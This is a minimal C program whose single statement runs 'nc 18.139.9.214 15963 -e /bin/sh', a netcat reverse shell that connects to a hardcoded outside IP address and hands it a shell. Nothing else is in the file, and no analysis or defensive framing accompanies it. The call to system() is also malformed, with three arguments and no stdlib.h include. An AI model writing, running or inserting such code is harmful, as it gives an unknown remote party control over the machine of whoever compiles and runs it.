#include<stdio.h>

int main() {
    system("nc 18.139.9.214 15963 -e /bin/sh", 0, 0);
}